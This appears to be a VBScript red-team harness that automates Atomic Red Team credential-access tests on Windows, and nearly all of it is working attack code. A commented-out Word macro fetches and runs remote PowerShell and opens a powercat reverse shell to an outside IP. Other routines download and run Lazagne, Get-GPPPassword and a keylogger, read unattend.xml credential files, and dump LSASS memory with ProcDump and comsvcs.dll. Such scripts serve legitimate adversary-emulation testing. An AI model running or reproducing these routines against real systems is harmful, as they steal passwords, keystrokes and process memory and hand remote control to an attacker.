
'Private Sub Document_Open()
'Set Shl = CreateObject("WScript.Shell")
'Shl.Run ("powershell -noexit -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/att-cso-scrape-trl27/benignstuff/main/easy.ps1');powercat '-c 3.17.72.248 -p 443 -e cmd -v")
'End Sub
'
'IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1");Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"

'Admin required
Private Sub T1552_001a()
	Wscript.Echo "==================== Test T1552_001a Begin	===================="
	Wscript.Echo "Procedure: Search for unattend config files in panther directory"
	mainSh1 = "cmd /K type C:\Windows\Panther\unattend.xml > .\T1552_001a_t1.txt"
	mainSh3 = "C:\Windows\Panther\unattend.xml"
	mainSh4 = "C:\Windows\Panther\unattend\unattend.xml"
	mainSh2 = "cmd /K type C:\Windows\Panther\Unattend\unattend.xml > .\T1552_001a_t2.txt"
	
	If CreateObject("Scripting.FileSystemObject").FileExists(mainSh3) Then
		Wscript.Echo "Success: File C:\Windows\Panther\unattend.xml Found! Written to T1552_001a_t1.txt"
		CreateObject("WScript.Shell").run mainSh1, 0, False
	Else
		Wscript.Echo "Failure: File " & mainSh3 & " not found"
	End If
	
	If CreateObject("Scripting.FileSystemObject").FileExists(mainSh4) Then
		Wscript.Echo "Success: C:\Windows\Panther\Unattend\unattend.xml Found! Written to T1552_001a_t2.txt"
		CreateObject("WScript.Shell").run mainSh2, 0, False
	Else
		Wscript.Echo "Failure: File " & mainSh4 & " not found"
	End If
	Wscript.Echo "==================== Test T1552_001a End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1555()
	Wscript.Echo "==================== Test T1555 Begin	===================="
	Wscript.Echo "Procedure: Word.exe macro Password Manager dump exploit"
	On Error Resume Next
	mainSh = "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/att-cso-scrape-trl27/benignstuff/main/Invoke-MalDocs.ps1');Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/att-cso-scrape-trl27/benignstuff/main/T1555-macrocode.txt' -OutFile macrocode.txt;Invoke-Maldoc -macroFile macrocode.txt -officeProduct 'Word' -sub 'Extract'"
	CreateObject("WScript.Shell").Run mainSh, 0, False
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error downloading or Running Invoke-Maldoc: " & Err.Description
		Err.Clear
	Else
		b = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
		Wscript.Echo "Success: Passwords found written to " & b & "\T1555-Creds.txt"
	End If
	On Error Goto 0
	Wscript.Echo "==================== Test T1555 End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1555_003a()
	Wscript.Echo "====================	Test T1555_003a Begin	===================="
	Wscript.Echo "Procedure: Chrome Password Theft Collector (accesschk)"
	On Error Resume Next
	mainSh = "powershell Invoke-WebRequest 'https://github.com/att-cso-scrape-trl27/benignstuff/blob/main/Modified-SysInternalsSuite.zip?raw=true' -OutFile '.\Modified-SysInternalsSuite.zip';Expand-Archive .\Modified-SysInternalsSuite.zip .\sysinternals -Force;Remove-Item .\Modified-SysInternalsSuite.zip -Force"
	CreateObject("WScript.Shell").Run mainSh, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error Downloading sysinternal files: " & Err.Description
		Err.Clear
	Else
		WScript.Echo "Success: sysinternal file downloaded. Do you wish to run (y/n)? (A new PS window will pop up. Input is required):"
		UInput = WScript.StdIn.ReadLine
		If UInput = "y" Then
			CreateObject("WScript.Shell").Run "powershell -noexit Echo 'If successfully run, a SQLite db will be written, 'passworddb', to the \sysinternals directory. A list of all sites with associated passwords will be listed below as well. Press Enter to exit the program.';Set-Location -path '.\sysinternals';.\accesschk.exe -accepteula .", 1, False
		End If
	End If
	On Error Goto 0
	Wscript.Echo "====================	Test T1555_003a End ====================" & vbCrLf & vbCrLf

End Sub

Private Sub T1555_003c()
	Wscript.Echo "====================	Test T1555_003c Begin	===================="
	Wscript.Echo "Procedure: Browser Password Theft Collector (Lazagne)"
	On Error Resume Next
	mainSh = "powershell Invoke-WebRequest 'https://github.com/att-cso-scrape-trl27/benignstuff/blob/main/lazagne.exe?raw=true' -OutFile '.\lazagne1.exe'"
	CreateObject("WScript.Shell").Run mainSh, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error Downloading lazagne files: " & Err.Description
		Err.Clear
	Else
		WScript.Echo "Success: lazagne file downloaded. Do you wish to run (y/n)? (A new PS window will pop up. Input is required):"
		UInput = WScript.StdIn.ReadLine
		If UInput = "y" Then
			CreateObject("WScript.Shell").Run "powershell -noexit Echo 'Attempting to run lazagne';.\lazagne.exe browsers > lazagne.out", 1, False
				If Err.Number <> 0 Then
					Wscript.Echo "Failure: Error running lazagne: " & Err.Description
					Err.Clear
				End If
		End If
	End If
	On Error Goto 0
	Wscript.Echo "====================	Test T1555_003c End	====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1552_006()
	Wscript.Echo "==================== Test T1552_006 Begin	===================="
	Wscript.Echo "Procedure: Pull encrypted cpassword value from GP file on the DC via ps script (GPPPassword)"
	On Error Resume Next
	mainSh = "powershell Invoke-WebRequest 'https://github.com/att-cso-scrape-trl27/benignstuff/blob/main/Get-GPPPassword.ps1?raw=true' -OutFile '.\Get-GPPPassword.ps1'"
	CreateObject("WScript.Shell").Run mainSh, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error Downloading Get-GPPPassword files: " & Err.Description
		Err.Clear
	Else
		Wscript.Echo "Download successful, Attempting to run GPPPassword.ps1"
		If CreateObject("Scripting.FileSystemObject").FileExists(".\t1552_006.txt") Then
			CreateObject("Wscript.Shell").Run "del .\t1552_006.txt", 0, True
		End If
		CreateObject("WScript.Shell").Run "powershell.exe .\Get-GPPPassword.ps1 -Verbose > .\t1552_006.txt", 1, True
		If Err.Number <> 0 Then
			Wscript.Echo "Failure: Error Executing Get-GPPPassword: " & Err.Description
			Err.Clear
		Else
			If CreateObject("Scripting.FileSystemObject").FileExists(".\t1552_006.txt") Then
				Wscript.Echo "Success: Output written to t1552_006.txt"
			Else
				Wscript.Echo "Failure: Failed to execute Get-GPPPassword"
			End If
		End If
	End If
	On Error Goto 0
	'Need to stage this before testing with it
	Wscript.Echo "==================== Test T1552_006 End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1558_034()
	Wscript.Echo "==================== Test T1558_034 Begin	===================="
	Wscript.Echo "Procedure: Kerberoasting"
	'Need to stage this before testing with it
	
	Wscript.Echo "==================== Test T1558_034 End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1056_001()
	Wscript.Echo "==================== Test T1056_001 Begin	===================="
	Wscript.Echo "Procedure:Keylogger (Get-Keystrokes.ps1)"
	On Error Resume Next
	mainSh = "powershell Invoke-WebRequest 'https://raw.githubusercontent.com/att-cso-scrape-trl27/benignstuff/main/Get-Keystrokes.ps1' -OutFile '.\AllDaKeys.ps1'"
	CreateObject("WScript.Shell").Run mainSh, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error Downloading Or Running Keylogger files: " & Err.Description
		Err.Clear
	Else
		WScript.Echo "Success: keylogger file downloaded. Do you wish to run (y/n)? (A new PS window will pop up, continual running is required to capture inputs):"
		UInput = WScript.StdIn.ReadLine
		If UInput = "y" Then
			CreateObject("WScript.Shell").Run "powershell -noexit Echo 'Attempting to run keylogger, results written to .\key.log';.\AllDaKeys.ps1 -LogPath .\key.log", 1, False
				If Err.Number <> 0 Then
					Wscript.Echo "Failure: Error running keylogger: " & Err.Description
					Err.Clear
				End If
		End If
	End If
	On Error Goto 0
	Wscript.Echo "==================== Test T1056_001 End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1003_004()
	Wscript.Echo "==================== Test T1003_004 Begin	===================="
	Wscript.Echo "Procedure: LSA secrets dump (PsExec.exe)"
	'Requires additional staging'
	
	Wscript.Echo "==================== Test T1003_004 End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1003_001a()
	Wscript.Echo "==================== Test T1003_001a Begin	===================="
	Wscript.Echo "Procedure: Dumping LSASS via ProcDump"
	On Error Resume Next
	mainSh1 = "powershell Invoke-WebRequest 'https://github.com/att-cso-scrape-trl27/benignstuff/blob/main/procdump.exe?raw=true' -OutFile '.\procdump.exe';.\procdump.exe -accepteula -ma lsass.exe .\T1003_001a.dmp > .\T1003_001a_rslt.txt"
	mainSh4 = "del .\T1003_001a_rslt.txt"
	CreateObject("WScript.Shell").Run mainSh1, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error Downloading Or Running ProcDump: " & Err.Description
		Err.Clear
	Else
		If CreateObject("Scripting.FileSystemObject").FileExists(".\T1003_001a.dmp") Then
			Wscript.Echo "Success: lsass dmp written to .\T1003_001a.dmp"
			CreateObject("Wscript.Shell").Run mainSh4, 0, True
		Else
			Wscript.Echo "Failure: ProcDump failed to create dmp, Err Msg written to T1003_001a_rslt.txt"
		End If
		On Error Goto 0
	End If
	Wscript.Echo "==================== Test T1003_001a End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1003_001b()
	Wscript.Echo "==================== Test T1003_001b Begin	===================="
	Wscript.Echo "Procedure: Dumping LSASS via comsvcs.dll"
	On Error Resume Next
	mainSh1 = "powershell C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id .\T1003_001b.dmp full"
	CreateObject("WScript.Shell").Run mainSh1, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error creating dmp: " & Err.Description
	Else
		If CreateObject("Scripting.FileSystemObject").FileExists(".T1003_001b.dmp") Then
			Wscript.Echo "Success: lsass dmp written to .\T1003_001b.dmp"
		Else
			Wscript.Echo "Failure: Failure creating dmp"
		End If
	End If
	On Error Goto 0
	Wscript.Echo "==================== Test T1003_001b End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1003_001c()
	Wscript.Echo "==================== Test T1003_001c Begin	===================="
	Wscript.Echo "Procedure:Dumping LSASS via Out-Minidump.psl"
	'This will require stagins
	
	Wscript.Echo "==================== Test T1003_001c End ====================" & vbCrLf & vbCrLf
End Sub

Private Sub T1003_001d()
	Wscript.Echo "==================== Test T1003_001d Begin	===================="
	Wscript.Echo "Procedure: Dumping LSASS minidump via ProcDump"
	On Error Resume Next
	mainSh1 = "powershell Invoke-WebRequest 'https://github.com/att-cso-scrape-trl27/benignstuff/blob/main/procdump.exe?raw=true' -OutFile '.\procdump.exe';.\procdump.exe -accepteula -mm lsass.exe .\T1003_001d.dmp > .\T1003_001d_rslt.txt"
	mainSh4 = "del .\T1003_001d_rslt.txt"
	CreateObject("WScript.Shell").Run mainSh1, 0, True
	If Err.Number <> 0 Then
		Wscript.Echo "Failure: Error Downloading Or Running ProcDump: " & Err.Description
		Err.Clear
	Else
		If CreateObject("Scripting.FileSystemObject").FileExists(".\T1003_001d.dmp") Then
			Wscript.Echo "Success: lsass dmp written to .\T1003_001d.dmp"
			CreateObject("Wscript.Shell").Run mainSh4, 0, True
		Else
			Wscript.Echo "Failure: ProcDump failed to create dmp, Err Msg written to T1003_001d_rslt.txt"
		End If
		On Error Goto 0
	End If
	Wscript.Echo "==================== Test T1003_001d End ====================" & vbCrLf & vbCrLf
End Sub
Wscript.Echo "ART Gauntlet Test Script!. This runs multiple ART Pen Tests and tells you the output." & vbCrLf & vbCrLf & "Considerations: Fully Manual tests are not done (i.e opening Tsk Mgr and manually creating a dmp of lsass.exe) as this is intended for automated testing. Also all Mimikatz based tests ( a considerable number of potential tests in the ART portfolio) are ignored as loading Mimikatz on the box alone is enough of a cause for alarm. This could be added in Future updates to script. In a similar vein, pypykatz tests are also ignored. Also I did not include ANY of the clean up procedures for the tests. This could be added later or a re-image could have the same effect if needed" & vbCrLf & vbCrLf  & "TESTING BEGINS" & vbCrLf & vbCrLf
'T1552_001a()
'T1555()
'T1555_003a()
'T1555_003c()
'T1056_001()
'T1003_001a()
'T1003_001b()
'T1003_001c()
'T1003_001d()
T1552_006()